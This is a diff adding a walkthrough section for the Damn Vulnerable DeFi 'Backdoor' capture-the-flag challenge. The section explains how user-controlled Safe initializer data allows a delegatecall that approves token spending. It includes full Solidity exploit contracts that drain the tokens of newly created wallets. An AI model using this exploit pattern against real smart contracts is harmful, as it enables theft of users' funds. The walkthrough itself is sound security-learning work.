@@ -564,6 +564,112 @@ Run `forge test --mp test/free-rider/FreeRider.t.sol --isolate` to validate test
 
 ---
 
+## 11.BACKDOR
+
+**Objective**
+
+_from `_isSolved()` in test_
+
+1. _Player must have executed a single transaction_
+2. _User must have registered a wallet_
+3. _User is no longer registered as a beneficiary_
+4. _Recovery account must own all tokens_
+
+**Attack Analysis**
+
+- The vulnerability lies in how the Safe contract is initialized during wallet creation. In `SafeProxyFactory.createProxyWithCallback()`, the `deployProxy()` function is called with user-controlled initializer data.
+- This initializer data is passed to `Safe.setup()` during proxy creation, allowing an attacker to control the `to` and `data` parameters. The `to` parameter specifies a contract address for an optional delegate call, and data contains the payload for that delegate call.
+- By carefully crafting the initializer data, an attacker can make the newly created wallet perform a delegate call to a malicious contract, which can then drain the wallet's funds.
+
+**POC**
+
+See [test/backdoor/Backdoor.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4-walkthrough/blob/master/test/backdoor/Backdoor.t.sol)
+
+```solidity
+ function test_backdoor() public checkSolvedByPlayer {
+    new Attack(
+        address(singletonCopy),
+        address(walletFactory),
+        address(walletRegistry),
+        address(token),
+        recovery,
+        users
+    );
+}
+
+contract Attack {
+    address private immutable singletonCopy;
+    address private immutable walletFactory;
+    address private immutable walletRegistry;
+    DamnValuableToken private immutable dvt;
+    address recovery;
+
+    constructor(
+        address _masterCopy,
+        address _walletFactory,
+        address _registry,
+        address _token,
+        address _recovery,
+        address[] memory _beneficiaries
+    ) {
+        singletonCopy = _masterCopy;
+        walletFactory = _walletFactory;
+        walletRegistry = _registry;
+        dvt = DamnValuableToken(_token);
+        recovery = _recovery;
+
+        // A 2nd contract is used because of the restriction on player tx count
+        AttackDelegate attackDelegate = new AttackDelegate(dvt);
+
+        for (uint256 i = 0; i < 4; i++) {
+            address[] memory beneficiary = new address[](1);
+            beneficiary[0] = _beneficiaries[i];
+
+            // Create the GnosisSafe::setup() data that will be passed to the proxyCreated function in WalletRegistry
+            bytes memory _initializer = abi.encodeWithSelector(
+                Safe.setup.selector, // Selector for the setup() function call
+                beneficiary, // _owners = List of Safe owners
+                1, // _threshold = Number of required confirmations for a Safe transaction
+                address(attackDelegate), // to = Contract address for optional delegate call.
+                abi.encodeWithSignature("delegateApprove(address)", address(this)), // data = Data payload for optional delegate call
+                address(0), // fallbackHandler = Handler for fallback calls to this contract
+                0, // paymentToken = Token that should be used for the payment (0 is ETH)
+                0, // payment = Value that should be paid
+                0 // paymentReceiver = Adddress that should receive the payment (or 0 if tx.origin)
+            );
+
+            // Create new proxies on behalf of other users
+            SafeProxy _newProxy = SafeProxyFactory(walletFactory).createProxyWithCallback(
+                singletonCopy, // _singleton = Address of singleton contract
+                _initializer, // initializer = Payload for message call sent to new proxy contract
+                i, // saltNonce = Nonce that will be used to generate the salt to calculate the address of the new proxy contract
+                IProxyCreationCallback(walletRegistry) // callback = Cast walletRegistry to IProxyCreationCallback
+            );
+
+            // Transfer to attacker
+            dvt.transferFrom(address(_newProxy), recovery, 10 ether);
+        }
+    }
+}
+
+contract AttackDelegate {
+    DamnValuableToken private immutable dvt;
+
+    constructor(DamnValuableToken _dvt) {
+        dvt = _dvt;
+    }
+
+    function delegateApprove(address _spender) external {
+        dvt.approve(_spender, 10 ether);
+    }
+}
+
+```
+
+Run `forge test --mp test/backdoor/Backdoor.t.sol --isolate` to validate test
+
+---
+
 ## 14.PUPPET V3
 
 **Obejctive**
